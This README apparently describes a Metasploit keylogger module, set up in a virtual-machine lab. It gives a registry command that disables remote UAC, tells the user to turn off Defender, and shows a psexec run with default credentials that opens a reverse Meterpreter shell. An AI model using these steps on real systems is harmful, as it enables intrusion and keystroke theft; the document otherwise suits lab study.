# Big Brogger
A Metasploit module that captures keystrokes on compromised Windows machines.

## Requirements
- Kali Linux virtual machine with Metasploit
- Windows 10 virtual machine

## Setup
Before attacking, you need to install and make the Windows machine vulnerable. You can find a guide to help you [here](https://medium.com/@bmatth21/how-to-setup-windows-10-vm-lab-for-hacking-608592d550f2).

You also need to disable the Windows Defender real-time protection in `Windows Security > Virus & threat protection > Real-time protection`

Finally, you need to disable the remote UAC by opening a terminal as administrator and type the following command:
```
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

## Usage
This a post module so you will have to get access to the Windows machine. You can do it by any means but we will use `windows/smb/psexec` in Metasploit for the demonstration.

First, use psexec to get a session with a valid credential:
```
msf > use windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/smb/psexec) > set RHOST 10.0.2.15
RHOST => 10.0.2.15
msf exploit(windows/smb/psexec) > set SMBUser admin
SMBUser => admin
msf exploit(windows/smb/psexec) > set SMBPass admin
SMBPass => admin
msf exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.0.2.4:4444
[*] 10.0.2.15:445 - Connecting to the server...
[*] 10.0.2.15:445 - Authenticating to 10.0.2.15 as user 'admin'...
[*] 10.0.2.15:445 - Selecting native target
[*] 10.0.2.15:445 - Uploading payload...
[*] 10.0.2.15:445 - Created \PTIhqIrQ.exe...
[+] 10.0.2.15:445 - Service started successfully...
[*] 10.0.2.15:445 - Deleting \PTIhqIrQ.exe...
[*] Sending stage (175686 bytes) to 10.0.2.15
[*] Meterpreter session 1 opened (10.0.2.4:4444 -> 10.0.2.15:49782) at 2024-03-22 21:39:59 +0100

meterpreter >
```